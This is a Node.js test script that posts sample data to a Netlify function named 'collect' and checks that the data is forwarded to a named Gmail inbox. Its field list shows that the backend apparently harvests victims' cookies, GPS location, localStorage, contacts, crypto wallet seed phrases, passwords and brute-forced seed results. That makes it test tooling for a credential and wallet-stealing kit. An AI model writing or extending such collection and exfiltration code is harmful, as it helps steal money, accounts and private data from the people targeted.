const axios = require("axios");

async function testNetlifyFunction() {
  console.log("🔧 Testing Netlify Function...");

  // Replace with your actual Netlify URL
  const netlifyUrl = "https://your-site-name.netlify.app";

  const testData = {
    timestamp: new Date().toISOString(),
    ip: "192.168.1.100",
    userAgent: "Test User Agent",
    platform: "Test Platform",
    device: "Test Device",
    language: "en-US",
    screen: "1920x1080",
    cookies: "test=value",
    latitude: "40.7128",
    longitude: "-74.0060",
    accuracy: "10",
    geoError: "None",
    localStorage: "{}",
    contacts: "Test Contacts",
    walletName: "Test Wallet",
    seedPhrase: "test seed phrase",
    password: "test123",
    bruteForceResults: [{ seed: "test seed", valid: true }],
    interactionType: "Test",
    interactionTime: new Date().toISOString(),
  };

  try {
    console.log("📤 Sending test data to Netlify function...");
    console.log("📧 Expected email recipient: 411plus411@gmail.com");

    const response = await axios.post(
      `${netlifyUrl}/.netlify/functions/collect`,
      testData,
      {
        headers: { "Content-Type": "application/json" },
        timeout: 15000,
      }
    );

    console.log("✅ Function responded successfully!");
    console.log("📋 Status:", response.status);
    console.log("📋 Response:", response.data);
    console.log("");
    console.log("📧 Check your email at 411plus411@gmail.com");
    console.log("📧 Also check spam/junk folder");
  } catch (error) {
    console.error("❌ Function test failed:", error.message);

    if (error.response) {
      console.error("📋 Status:", error.response.status);
      console.error("📋 Response:", error.response.data);
    }

    console.log("");
    console.log("🔍 Possible issues:");
    console.log("1. Netlify function not deployed");
    console.log("2. Environment variables not set");
    console.log("3. Gmail app password incorrect");
    console.log("4. Function has errors");
  }
}

testNetlifyFunction();
